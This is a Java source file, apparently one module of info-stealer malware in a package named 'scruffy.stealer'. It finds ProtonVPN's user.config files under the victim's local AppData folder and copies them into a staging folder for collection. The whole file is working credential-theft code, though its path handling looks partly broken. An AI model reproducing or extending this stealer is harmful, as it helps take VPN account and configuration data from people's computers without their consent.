package scruffy.stealer.impl.vpn;

import java.io.File;

import org.apache.commons.io.FileUtils;

import scruffy.stealer.utils.utilities;

public class proton_vpn extends utilities {

	public void initialize() throws Exception {
		for (String path : new File(System.getenv("localappdata") + "/ProtonVPN").list()) {
			if (!path.contains("ProtonVPN.exe"))
				continue;

			for (String version : new File(path).list()) {
				String configLocation = String.format("%s/user.config", version);
                FileUtils.copyFile(new File(configLocation), new File(getFolder() + "/vpn/proton/user.config"));
				content.add("proton_vpn");
			}
		}
	}
	
}